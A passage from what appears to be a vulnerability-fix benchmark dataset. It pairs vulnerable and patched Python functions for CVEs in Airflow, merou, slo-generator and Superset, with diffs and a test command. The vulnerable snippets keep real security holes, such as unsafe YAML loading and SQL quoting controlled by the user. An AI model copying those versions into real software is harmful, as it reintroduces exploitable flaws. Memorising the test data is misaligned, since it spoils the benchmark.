      "https://github.com/apache/airflow/commit/b7a46c970d638028a4a7643ad000dcee951fb9ef"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_259_1",
        "commit": "a2b0a6a",
        "file_path": "airflow/www/forms.py",
        "start_line": 121,
        "end_line": 144,
        "snippet": "class DagRunEditForm(DynamicForm):\n    \"\"\"Form for editing DAG Run.\n\n    We don't actually want to allow editing, so everything is read-only here.\n    \"\"\"\n\n    dag_id = StringField(lazy_gettext(\"Dag Id\"), widget=BS3TextFieldROWidget())\n    start_date = DateTimeWithTimezoneField(lazy_gettext(\"Start Date\"), widget=AirflowDateTimePickerROWidget())\n    end_date = DateTimeWithTimezoneField(lazy_gettext(\"End Date\"), widget=AirflowDateTimePickerROWidget())\n    run_id = StringField(lazy_gettext(\"Run Id\"), widget=BS3TextFieldROWidget())\n    state = StringField(lazy_gettext(\"State\"), widget=BS3TextFieldROWidget())\n    execution_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"Logical Date\"),\n        widget=AirflowDateTimePickerROWidget(),\n    )\n    conf = TextAreaField(lazy_gettext(\"Conf\"), widget=BS3TextAreaROWidget())\n    note = TextAreaField(lazy_gettext(\"User Note\"), widget=BS3TextAreaFieldWidget())\n\n    def populate_obj(self, item):\n        \"\"\"Populates the attributes of the passed obj with data from the form's fields.\"\"\"\n        super().populate_obj(item)\n        item.run_type = DagRunType.from_run_id(item.run_id)\n        if item.conf:\n            item.conf = json.loads(item.conf)"
      },
      {
        "id": "vul_py_259_2",
        "commit": "a2b0a6a",
        "file_path": "airflow/www/forms.py",
        "start_line": 147,
        "end_line": 172,
        "snippet": "class TaskInstanceEditForm(DynamicForm):\n    \"\"\"Form for editing TaskInstance.\"\"\"\n\n    dag_id = StringField(lazy_gettext(\"Dag Id\"), validators=[InputRequired()], widget=BS3TextFieldROWidget())\n    task_id = StringField(\n        lazy_gettext(\"Task Id\"), validators=[InputRequired()], widget=BS3TextFieldROWidget()\n    )\n    start_date = DateTimeWithTimezoneField(lazy_gettext(\"Start Date\"), widget=AirflowDateTimePickerROWidget())\n    end_date = DateTimeWithTimezoneField(lazy_gettext(\"End Date\"), widget=AirflowDateTimePickerROWidget())\n    state = SelectField(\n        lazy_gettext(\"State\"),\n        choices=(\n            (\"success\", \"success\"),\n            (\"running\", \"running\"),\n            (\"failed\", \"failed\"),\n            (\"up_for_retry\", \"up_for_retry\"),\n        ),\n        widget=Select2Widget(),\n        validators=[InputRequired()],\n    )\n    execution_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"Logical Date\"),\n        widget=AirflowDateTimePickerROWidget(),\n        validators=[InputRequired()],\n    )\n    note = TextAreaField(lazy_gettext(\"User Note\"), widget=BS3TextAreaFieldWidget())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_259_1",
        "commit": "2a0106e",
        "file_path": "airflow/www/forms.py",
        "start_line": 121,
        "end_line": 151,
        "snippet": "class DagRunEditForm(DynamicForm):\n    \"\"\"Form for editing DAG Run.\n\n    Only note field is editable, so everything else is read-only here.\n    \"\"\"\n\n    dag_id = StringField(lazy_gettext(\"Dag Id\"), validators=[ReadOnly()], widget=BS3TextFieldROWidget())\n    start_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"Start Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n    )\n    end_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"End Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n    )\n    run_id = StringField(lazy_gettext(\"Run Id\"), validators=[ReadOnly()], widget=BS3TextFieldROWidget())\n    state = StringField(lazy_gettext(\"State\"), validators=[ReadOnly()], widget=BS3TextFieldROWidget())\n    execution_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"Logical Date\"),\n        validators=[ReadOnly()],\n        widget=AirflowDateTimePickerROWidget(),\n    )\n    conf = TextAreaField(lazy_gettext(\"Conf\"), validators=[ReadOnly()], widget=BS3TextAreaROWidget())\n    note = TextAreaField(lazy_gettext(\"User Note\"), widget=BS3TextAreaFieldWidget())\n\n    def populate_obj(self, item):\n        \"\"\"Populates the attributes of the passed obj with data from the form's not-read-only fields.\"\"\"\n        for name, field in self._fields.items():\n            if not field.flags.readonly:\n                field.populate_obj(item, name)\n        item.run_type = DagRunType.from_run_id(item.run_id)\n        if item.conf:\n            item.conf = json.loads(item.conf)"
      },
      {
        "id": "fix_py_259_2",
        "commit": "2a0106e",
        "file_path": "airflow/www/forms.py",
        "start_line": 154,
        "end_line": 194,
        "snippet": "class TaskInstanceEditForm(DynamicForm):\n    \"\"\"Form for editing TaskInstance.\n\n    Only note and state fields are editable, so everything else is read-only here.\n    \"\"\"\n\n    dag_id = StringField(\n        lazy_gettext(\"Dag Id\"), validators=[InputRequired(), ReadOnly()], widget=BS3TextFieldROWidget()\n    )\n    task_id = StringField(\n        lazy_gettext(\"Task Id\"), validators=[InputRequired(), ReadOnly()], widget=BS3TextFieldROWidget()\n    )\n    start_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"Start Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n    )\n    end_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"End Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n    )\n    state = SelectField(\n        lazy_gettext(\"State\"),\n        choices=(\n            (\"success\", \"success\"),\n            (\"running\", \"running\"),\n            (\"failed\", \"failed\"),\n            (\"up_for_retry\", \"up_for_retry\"),\n        ),\n        widget=Select2Widget(),\n        validators=[InputRequired()],\n    )\n    execution_date = DateTimeWithTimezoneField(\n        lazy_gettext(\"Logical Date\"),\n        widget=AirflowDateTimePickerROWidget(),\n        validators=[InputRequired(), ReadOnly()],\n    )\n    note = TextAreaField(lazy_gettext(\"User Note\"), widget=BS3TextAreaFieldWidget())\n\n    def populate_obj(self, item):\n        \"\"\"Populates the attributes of the passed obj with data from the form's not-read-only fields.\"\"\"\n        for name, field in self._fields.items():\n            if not field.flags.readonly:\n                field.populate_obj(item, name)"
      },
      {
        "id": "fix_py_259_3",
        "commit": "2a0106e",
        "file_path": "airflow/www/validators.py",
        "start_line": 102,
        "end_line": 110,
        "snippet": "class ReadOnly:\n    \"\"\"Adds readonly flag to a field.\n\n    When using this you normally will need to override the form's populate_obj method,\n    so field.populate_obj is not called for read-only fields.\n    \"\"\"\n\n    def __call__(self, form, field):\n        field.flags.readonly = True"
      }
    ],
    "vul_patch": "--- a/airflow/www/forms.py\n+++ b/airflow/www/forms.py\n@@ -1,24 +1,31 @@\n class DagRunEditForm(DynamicForm):\n     \"\"\"Form for editing DAG Run.\n \n-    We don't actually want to allow editing, so everything is read-only here.\n+    Only note field is editable, so everything else is read-only here.\n     \"\"\"\n \n-    dag_id = StringField(lazy_gettext(\"Dag Id\"), widget=BS3TextFieldROWidget())\n-    start_date = DateTimeWithTimezoneField(lazy_gettext(\"Start Date\"), widget=AirflowDateTimePickerROWidget())\n-    end_date = DateTimeWithTimezoneField(lazy_gettext(\"End Date\"), widget=AirflowDateTimePickerROWidget())\n-    run_id = StringField(lazy_gettext(\"Run Id\"), widget=BS3TextFieldROWidget())\n-    state = StringField(lazy_gettext(\"State\"), widget=BS3TextFieldROWidget())\n+    dag_id = StringField(lazy_gettext(\"Dag Id\"), validators=[ReadOnly()], widget=BS3TextFieldROWidget())\n+    start_date = DateTimeWithTimezoneField(\n+        lazy_gettext(\"Start Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n+    )\n+    end_date = DateTimeWithTimezoneField(\n+        lazy_gettext(\"End Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n+    )\n+    run_id = StringField(lazy_gettext(\"Run Id\"), validators=[ReadOnly()], widget=BS3TextFieldROWidget())\n+    state = StringField(lazy_gettext(\"State\"), validators=[ReadOnly()], widget=BS3TextFieldROWidget())\n     execution_date = DateTimeWithTimezoneField(\n         lazy_gettext(\"Logical Date\"),\n+        validators=[ReadOnly()],\n         widget=AirflowDateTimePickerROWidget(),\n     )\n-    conf = TextAreaField(lazy_gettext(\"Conf\"), widget=BS3TextAreaROWidget())\n+    conf = TextAreaField(lazy_gettext(\"Conf\"), validators=[ReadOnly()], widget=BS3TextAreaROWidget())\n     note = TextAreaField(lazy_gettext(\"User Note\"), widget=BS3TextAreaFieldWidget())\n \n     def populate_obj(self, item):\n-        \"\"\"Populates the attributes of the passed obj with data from the form's fields.\"\"\"\n-        super().populate_obj(item)\n+        \"\"\"Populates the attributes of the passed obj with data from the form's not-read-only fields.\"\"\"\n+        for name, field in self._fields.items():\n+            if not field.flags.readonly:\n+                field.populate_obj(item, name)\n         item.run_type = DagRunType.from_run_id(item.run_id)\n         if item.conf:\n             item.conf = json.loads(item.conf)\n\n--- a/airflow/www/forms.py\n+++ b/airflow/www/forms.py\n@@ -1,12 +1,21 @@\n class TaskInstanceEditForm(DynamicForm):\n-    \"\"\"Form for editing TaskInstance.\"\"\"\n+    \"\"\"Form for editing TaskInstance.\n \n-    dag_id = StringField(lazy_gettext(\"Dag Id\"), validators=[InputRequired()], widget=BS3TextFieldROWidget())\n+    Only note and state fields are editable, so everything else is read-only here.\n+    \"\"\"\n+\n+    dag_id = StringField(\n+        lazy_gettext(\"Dag Id\"), validators=[InputRequired(), ReadOnly()], widget=BS3TextFieldROWidget()\n+    )\n     task_id = StringField(\n-        lazy_gettext(\"Task Id\"), validators=[InputRequired()], widget=BS3TextFieldROWidget()\n+        lazy_gettext(\"Task Id\"), validators=[InputRequired(), ReadOnly()], widget=BS3TextFieldROWidget()\n     )\n-    start_date = DateTimeWithTimezoneField(lazy_gettext(\"Start Date\"), widget=AirflowDateTimePickerROWidget())\n-    end_date = DateTimeWithTimezoneField(lazy_gettext(\"End Date\"), widget=AirflowDateTimePickerROWidget())\n+    start_date = DateTimeWithTimezoneField(\n+        lazy_gettext(\"Start Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n+    )\n+    end_date = DateTimeWithTimezoneField(\n+        lazy_gettext(\"End Date\"), validators=[ReadOnly()], widget=AirflowDateTimePickerROWidget()\n+    )\n     state = SelectField(\n         lazy_gettext(\"State\"),\n         choices=(\n@@ -21,6 +30,12 @@\n     execution_date = DateTimeWithTimezoneField(\n         lazy_gettext(\"Logical Date\"),\n         widget=AirflowDateTimePickerROWidget(),\n-        validators=[InputRequired()],\n+        validators=[InputRequired(), ReadOnly()],\n     )\n     note = TextAreaField(lazy_gettext(\"User Note\"), widget=BS3TextAreaFieldWidget())\n+\n+    def populate_obj(self, item):\n+        \"\"\"Populates the attributes of the passed obj with data from the form's not-read-only fields.\"\"\"\n+        for name, field in self._fields.items():\n+            if not field.flags.readonly:\n+                field.populate_obj(item, name)\n\n--- /dev/null\n+++ b/airflow/www/forms.py\n@@ -0,0 +1,9 @@\n+class ReadOnly:\n+    \"\"\"Adds readonly flag to a field.\n+\n+    When using this you normally will need to override the form's populate_obj method,\n+    so field.populate_obj is not called for read-only fields.\n+    \"\"\"\n+\n+    def __call__(self, form, field):\n+        field.flags.readonly = True\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-4768",
    "cve_description": "A vulnerability was found in Dropbox merou. It has been classified as critical. Affected is the function add_public_key of the file grouper/public_key.py of the component SSH Public Key Handler. The manipulation of the argument public_key_str leads to injection. It is possible to launch the attack remotely. The name of the patch is d93087973afa26bc0a2d0a5eb5c0fde748bdd107. It is recommended to apply a patch to fix this issue. VDB-216906 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/dropbox/merou",
    "patch_url": [
      "https://github.com/dropbox/merou/commit/d93087973afa26bc0a2d0a5eb5c0fde748bdd107"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_156_1",
        "commit": "30755ea",
        "file_path": "grouper/public_key.py",
        "start_line": 52,
        "end_line": 99,
        "snippet": "def add_public_key(session, user, public_key_str):\n    \"\"\"Add a public key for a particular user.\n\n    Args:\n        session: db session\n        user: User model of user in question\n        public_key_str: public key to add\n\n    Throws:\n        DuplicateKey if key is already in use\n        PublicKeyParseError if key can't be parsed\n        BadPublicKey if a plugin rejects the key\n\n    Returns:\n        PublicKey model object representing the key\n    \"\"\"\n    pubkey = sshpubkeys.SSHKey(public_key_str, strict=True)\n\n    try:\n        pubkey.parse()\n    except sshpubkeys.InvalidKeyException as e:\n        raise PublicKeyParseError(str(e))\n\n    try:\n        get_plugin_proxy().will_add_public_key(pubkey)\n    except PluginRejectedPublicKey as e:\n        raise BadPublicKey(str(e))\n\n    db_pubkey = PublicKey(\n        user=user,\n        public_key=pubkey.keydata.strip(),\n        fingerprint=pubkey.hash_md5().replace(\"MD5:\", \"\"),\n        fingerprint_sha256=pubkey.hash_sha256().replace(\"SHA256:\", \"\"),\n        key_size=pubkey.bits,\n        key_type=pubkey.key_type,\n        comment=pubkey.comment,\n    )\n\n    try:\n        db_pubkey.add(session)\n        Counter.incr(session, \"updates\")\n    except IntegrityError:\n        session.rollback()\n        raise DuplicateKey()\n\n    session.commit()\n\n    return db_pubkey"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_156_1",
        "commit": "d930879",
        "file_path": "grouper/public_key.py",
        "start_line": 52,
        "end_line": 106,
        "snippet": "def add_public_key(session, user, public_key_str):\n    \"\"\"Add a public key for a particular user.\n\n    Args:\n        session: db session\n        user: User model of user in question\n        public_key_str: public key to add\n\n    Throws:\n        DuplicateKey if key is already in use\n        PublicKeyParseError if key can't be parsed\n        BadPublicKey if a plugin rejects the key\n\n    Returns:\n        PublicKey model object representing the key\n    \"\"\"\n    pubkey = sshpubkeys.SSHKey(public_key_str, strict=True)\n\n    try:\n        pubkey.parse()\n    except sshpubkeys.InvalidKeyException as e:\n        raise PublicKeyParseError(str(e))\n\n    # Allowing newlines can lead to injection attacks depending on how the key is\n    # consumed, such as if it's dumped in an authorized_keys file with a `command`\n    # restriction.\n    # Note parsing the key is insufficient to block this.\n    if \"\\r\" in public_key_str or \"\\n\" in public_key_str:\n        raise PublicKeyParseError(\"Public key cannot have newlines\")\n\n    try:\n        get_plugin_proxy().will_add_public_key(pubkey)\n    except PluginRejectedPublicKey as e:\n        raise BadPublicKey(str(e))\n\n    db_pubkey = PublicKey(\n        user=user,\n        public_key=pubkey.keydata.strip(),\n        fingerprint=pubkey.hash_md5().replace(\"MD5:\", \"\"),\n        fingerprint_sha256=pubkey.hash_sha256().replace(\"SHA256:\", \"\"),\n        key_size=pubkey.bits,\n        key_type=pubkey.key_type,\n        comment=pubkey.comment,\n    )\n\n    try:\n        db_pubkey.add(session)\n        Counter.incr(session, \"updates\")\n    except IntegrityError:\n        session.rollback()\n        raise DuplicateKey()\n\n    session.commit()\n\n    return db_pubkey"
      }
    ],
    "vul_patch": "--- a/grouper/public_key.py\n+++ b/grouper/public_key.py\n@@ -20,6 +20,13 @@\n         pubkey.parse()\n     except sshpubkeys.InvalidKeyException as e:\n         raise PublicKeyParseError(str(e))\n+\n+    # Allowing newlines can lead to injection attacks depending on how the key is\n+    # consumed, such as if it's dumped in an authorized_keys file with a `command`\n+    # restriction.\n+    # Note parsing the key is insufficient to block this.\n+    if \"\\r\" in public_key_str or \"\\n\" in public_key_str:\n+        raise PublicKeyParseError(\"Public key cannot have newlines\")\n \n     try:\n         get_plugin_proxy().will_add_public_key(pubkey)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-22557",
    "cve_description": "SLO generator allows for loading of YAML files that if crafted in a specific format can allow for code execution within the context of the SLO Generator. We recommend upgrading SLO Generator past https://github.com/google/slo-generator/pull/173",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/google/slo-generator",
    "patch_url": [
      "https://github.com/google/slo-generator/commit/36318beab1b85d14bb860e45bea186b184690d5d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_266_1",
        "commit": "50ce1bf",
        "file_path": "slo_generator/migrations/migrator.py",
        "start_line": 215,
        "end_line": 247,
        "snippet": "def exporters_v1tov2(exporters_paths, shared_config={}, quiet=False):\n    \"\"\"Translate exporters to v2 and put into shared config.\n\n    Args:\n        exporters_path (list): List of exporters file paths.\n        shared_config (dict): Shared config to add exporters to.\n        quiet (bool): Quiet mode.\n\n    Returns:\n        list: List of exporters keys added to shared config.\n    \"\"\"\n    exp_keys = []\n    for exp_path in exporters_paths:\n        with open(exp_path, encoding='utf-8') as conf:\n            content = yaml.load(conf, Loader=yaml.Loader)\n        exporters = content\n\n        # If exporters file has sections, concatenate all of them\n        if isinstance(content, dict):\n            exporters = []\n            for _, value in content.items():\n                exporters.extend(value)\n\n        # If exporter not in general config, add it and add an alias for the\n        # exporter. Refer to the alias in the SLO config file.\n        for exporter in exporters:\n            exporter = OrderedDict(exporter)\n            exp_key = add_to_shared_config(exporter,\n                                           shared_config,\n                                           'exporters',\n                                           quiet=quiet)\n            exp_keys.append(exp_key)\n    return exp_keys"
      },
      {
        "id": "vul_py_266_2",
        "commit": "50ce1bf",
        "file_path": "slo_generator/migrations/migrator.py",
        "start_line": 250,
        "end_line": 285,
        "snippet": "def ebp_v1tov2(ebp_paths, shared_config={}, quiet=False):\n    \"\"\"Translate error budget policies to v2 and put into shared config\n\n    Args:\n        ebp_paths (list): List of error budget policies file paths.\n        shared_config (dict): Shared config to add exporters to.\n        quiet (bool): Quiet mode.\n\n    Returns:\n        list: List of error budget policies keys added to shared config.\n    \"\"\"\n    ebp_keys = []\n    for ebp_path in ebp_paths:\n        with open(ebp_path, encoding='utf-8') as conf:\n            error_budget_policy = yaml.load(conf, Loader=yaml.Loader)\n        for step in error_budget_policy:\n            step['name'] = step.pop('error_budget_policy_step_name')\n            step['burn_rate_threshold'] = step.pop(\n                'alerting_burn_rate_threshold')\n            step['alert'] = step.pop('urgent_notification')\n            step['message_alert'] = step.pop('overburned_consequence_message')\n            step['message_ok'] = step.pop('achieved_consequence_message')\n            step['window'] = step.pop('measurement_window_seconds')\n\n        ebp = {'steps': error_budget_policy}\n        if ebp_path.name == 'error_budget_policy.yaml':\n            ebp_key = 'default'\n        else:\n            ebp_key = ebp_path.stem.replace('error_budget_policy_', '')\n        ebp_key = add_to_shared_config(ebp,\n                                       shared_config,\n                                       'error_budget_policies',\n                                       ebp_key,\n                                       quiet=quiet)\n        ebp_keys.append(ebp_key)\n    return ebp_keys"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_266_1",
        "commit": "36318be",
        "file_path": "slo_generator/migrations/migrator.py",
        "start_line": 215,
        "end_line": 247,
        "snippet": "def exporters_v1tov2(exporters_paths, shared_config={}, quiet=False):\n    \"\"\"Translate exporters to v2 and put into shared config.\n\n    Args:\n        exporters_path (list): List of exporters file paths.\n        shared_config (dict): Shared config to add exporters to.\n        quiet (bool): Quiet mode.\n\n    Returns:\n        list: List of exporters keys added to shared config.\n    \"\"\"\n    exp_keys = []\n    for exp_path in exporters_paths:\n        with open(exp_path, encoding='utf-8') as conf:\n            content = yaml.load(conf, Loader=yaml.SafeLoader)\n        exporters = content\n\n        # If exporters file has sections, concatenate all of them\n        if isinstance(content, dict):\n            exporters = []\n            for _, value in content.items():\n                exporters.extend(value)\n\n        # If exporter not in general config, add it and add an alias for the\n        # exporter. Refer to the alias in the SLO config file.\n        for exporter in exporters:\n            exporter = OrderedDict(exporter)\n            exp_key = add_to_shared_config(exporter,\n                                           shared_config,\n                                           'exporters',\n                                           quiet=quiet)\n            exp_keys.append(exp_key)\n    return exp_keys"
      },
      {
        "id": "fix_py_266_2",
        "commit": "36318be",
        "file_path": "slo_generator/migrations/migrator.py",
        "start_line": 250,
        "end_line": 285,
        "snippet": "def ebp_v1tov2(ebp_paths, shared_config={}, quiet=False):\n    \"\"\"Translate error budget policies to v2 and put into shared config\n\n    Args:\n        ebp_paths (list): List of error budget policies file paths.\n        shared_config (dict): Shared config to add exporters to.\n        quiet (bool): Quiet mode.\n\n    Returns:\n        list: List of error budget policies keys added to shared config.\n    \"\"\"\n    ebp_keys = []\n    for ebp_path in ebp_paths:\n        with open(ebp_path, encoding='utf-8') as conf:\n            error_budget_policy = yaml.load(conf, Loader=yaml.SafeLoader)\n        for step in error_budget_policy:\n            step['name'] = step.pop('error_budget_policy_step_name')\n            step['burn_rate_threshold'] = step.pop(\n                'alerting_burn_rate_threshold')\n            step['alert'] = step.pop('urgent_notification')\n            step['message_alert'] = step.pop('overburned_consequence_message')\n            step['message_ok'] = step.pop('achieved_consequence_message')\n            step['window'] = step.pop('measurement_window_seconds')\n\n        ebp = {'steps': error_budget_policy}\n        if ebp_path.name == 'error_budget_policy.yaml':\n            ebp_key = 'default'\n        else:\n            ebp_key = ebp_path.stem.replace('error_budget_policy_', '')\n        ebp_key = add_to_shared_config(ebp,\n                                       shared_config,\n                                       'error_budget_policies',\n                                       ebp_key,\n                                       quiet=quiet)\n        ebp_keys.append(ebp_key)\n    return ebp_keys"
      }
    ],
    "vul_patch": "--- a/slo_generator/migrations/migrator.py\n+++ b/slo_generator/migrations/migrator.py\n@@ -12,7 +12,7 @@\n     exp_keys = []\n     for exp_path in exporters_paths:\n         with open(exp_path, encoding='utf-8') as conf:\n-            content = yaml.load(conf, Loader=yaml.Loader)\n+            content = yaml.load(conf, Loader=yaml.SafeLoader)\n         exporters = content\n \n         # If exporters file has sections, concatenate all of them\n\n--- a/slo_generator/migrations/migrator.py\n+++ b/slo_generator/migrations/migrator.py\n@@ -12,7 +12,7 @@\n     ebp_keys = []\n     for ebp_path in ebp_paths:\n         with open(ebp_path, encoding='utf-8') as conf:\n-            error_budget_policy = yaml.load(conf, Loader=yaml.Loader)\n+            error_budget_policy = yaml.load(conf, Loader=yaml.SafeLoader)\n         for step in error_budget_policy:\n             step['name'] = step.pop('error_budget_policy_step_name')\n             step['burn_rate_threshold'] = step.pop(\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-49736",
    "cve_description": "A where_in JINJA macro allows users to specify a quote, which combined with a carefully crafted statement\u00a0would allow for SQL injection\u00a0in Apache Superset.This issue affects Apache Superset: before 2.1.2, from 3.0.0 before 3.0.2.\n\nUsers are recommended to upgrade to version 3.0.2, which fixes the issue.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/apache/superset",
    "patch_url": [
      "https://github.com/apache/superset/commit/1d403dab9822a8cee6108669c53e53fad881c751",
      "https://github.com/apache/superset/commit/34101594e284ab3acce692f41aff7759ccb4bf1d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_19_1",
        "commit": "2f46890",
        "file_path": "superset/jinja_context.py",
        "start_line": 400,
        "end_line": 416,
        "snippet": "def where_in(values: list[Any], mark: str = \"'\") -> str:\n    \"\"\"\n    Given a list of values, build a parenthesis list suitable for an IN expression.\n\n        >>> where_in([1, \"b\", 3])\n        (1, 'b', 3)\n\n    \"\"\"\n\n    def quote(value: Any) -> str:\n        if isinstance(value, str):\n            value = value.replace(mark, mark * 2)\n            return f\"{mark}{value}{mark}\"\n        return str(value)\n\n    joined_values = \", \".join(quote(value) for value in values)\n    return f\"({joined_values})\""
      },
      {
        "id": "vul_py_19_2",
        "commit": "2f46890",
        "file_path": "superset/jinja_context.py",
        "start_line": 427,
        "end_line": 452,
        "snippet": "    def __init__(\n        self,\n        database: \"Database\",\n        query: Optional[\"Query\"] = None,\n        table: Optional[\"SqlaTable\"] = None,\n        extra_cache_keys: Optional[list[Any]] = None,\n        removed_filters: Optional[list[str]] = None,\n        applied_filters: Optional[list[str]] = None,\n        **kwargs: Any,\n    ) -> None:\n        self._database = database\n        self._query = query\n        self._schema = None\n        if query and query.schema:\n            self._schema = query.schema\n        elif table:\n            self._schema = table.schema\n        self._extra_cache_keys = extra_cache_keys\n        self._applied_filters = applied_filters\n        self._removed_filters = removed_filters\n        self._context: dict[str, Any] = {}\n        self._env = SandboxedEnvironment(undefined=DebugUndefined)\n        self.set_context(**kwargs)\n\n        # custom filters\n        self._env.filters[\"where_in\"] = where_in"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_19_1",
        "commit": "1d403da",
        "file_path": "superset/jinja_context.py",
        "start_line": 401,
        "end_line": 433,
        "snippet": "class WhereInMacro:  # pylint: disable=too-few-public-methods\n    def __init__(self, dialect: Dialect):\n        self.dialect = dialect\n\n    def __call__(self, values: list[Any], mark: Optional[str] = None) -> str:\n        \"\"\"\n        Given a list of values, build a parenthesis list suitable for an IN expression.\n\n            >>> from sqlalchemy.dialects import mysql\n            >>> where_in = WhereInMacro(dialect=mysql.dialect())\n            >>> where_in([1, \"Joe's\", 3])\n            (1, 'Joe''s', 3)\n\n        \"\"\"\n        binds = [bindparam(f\"value_{i}\", value) for i, value in enumerate(values)]\n        string_representations = [\n            str(\n                bind.compile(\n                    dialect=self.dialect, compile_kwargs={\"literal_binds\": True}\n                )\n            )\n            for bind in binds\n        ]\n        joined_values = \", \".join(string_representations)\n        result = f\"({joined_values})\"\n\n        if mark:\n            result += (\n                \"\\n-- WARNING: the `mark` parameter was removed from the `where_in` \"\n                \"macro for security reasons\\n\"\n            )\n\n        return result"
      },
      {
        "id": "fix_py_19_2",
        "commit": "1d403da",
        "file_path": "superset/jinja_context.py",
        "start_line": 444,
        "end_line": 469,
        "snippet": "    def __init__(\n        self,\n        database: \"Database\",\n        query: Optional[\"Query\"] = None,\n        table: Optional[\"SqlaTable\"] = None,\n        extra_cache_keys: Optional[list[Any]] = None,\n        removed_filters: Optional[list[str]] = None,\n        applied_filters: Optional[list[str]] = None,\n        **kwargs: Any,\n    ) -> None:\n        self._database = database\n        self._query = query\n        self._schema = None\n        if query and query.schema:\n            self._schema = query.schema\n        elif table:\n            self._schema = table.schema\n        self._extra_cache_keys = extra_cache_keys\n        self._applied_filters = applied_filters\n        self._removed_filters = removed_filters\n        self._context: dict[str, Any] = {}\n        self._env = SandboxedEnvironment(undefined=DebugUndefined)\n        self.set_context(**kwargs)\n\n        # custom filters\n        self._env.filters[\"where_in\"] = WhereInMacro(database.get_dialect())"
      }
    ],
    "vul_patch": "--- a/superset/jinja_context.py\n+++ b/superset/jinja_context.py\n@@ -1,17 +1,33 @@\n-def where_in(values: list[Any], mark: str = \"'\") -> str:\n-    \"\"\"\n-    Given a list of values, build a parenthesis list suitable for an IN expression.\n+class WhereInMacro:  # pylint: disable=too-few-public-methods\n+    def __init__(self, dialect: Dialect):\n+        self.dialect = dialect\n \n-        >>> where_in([1, \"b\", 3])\n-        (1, 'b', 3)\n+    def __call__(self, values: list[Any], mark: Optional[str] = None) -> str:\n+        \"\"\"\n+        Given a list of values, build a parenthesis list suitable for an IN expression.\n \n-    \"\"\"\n+            >>> from sqlalchemy.dialects import mysql\n+            >>> where_in = WhereInMacro(dialect=mysql.dialect())\n+            >>> where_in([1, \"Joe's\", 3])\n+            (1, 'Joe''s', 3)\n \n-    def quote(value: Any) -> str:\n-        if isinstance(value, str):\n-            value = value.replace(mark, mark * 2)\n-            return f\"{mark}{value}{mark}\"\n-        return str(value)\n+        \"\"\"\n+        binds = [bindparam(f\"value_{i}\", value) for i, value in enumerate(values)]\n+        string_representations = [\n+            str(\n+                bind.compile(\n+                    dialect=self.dialect, compile_kwargs={\"literal_binds\": True}\n+                )\n+            )\n+            for bind in binds\n+        ]\n+        joined_values = \", \".join(string_representations)\n+        result = f\"({joined_values})\"\n \n-    joined_values = \", \".join(quote(value) for value in values)\n-    return f\"({joined_values})\"\n+        if mark:\n+            result += (\n+                \"\\n-- WARNING: the `mark` parameter was removed from the `where_in` \"\n+                \"macro for security reasons\\n\"\n+            )\n+\n+        return result\n\n--- a/superset/jinja_context.py\n+++ b/superset/jinja_context.py\n@@ -23,4 +23,4 @@\n         self.set_context(**kwargs)\n \n         # custom filters\n-        self._env.filters[\"where_in\"] = where_in\n+        self._env.filters[\"where_in\"] = WhereInMacro(database.get_dialect())\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-49736:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/superset\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-49736/bin/python -m pytest tests/unit_tests/jinja_context_test.py::test_where_in -v\n",
    "unit_test_cmd": null
  },
  {
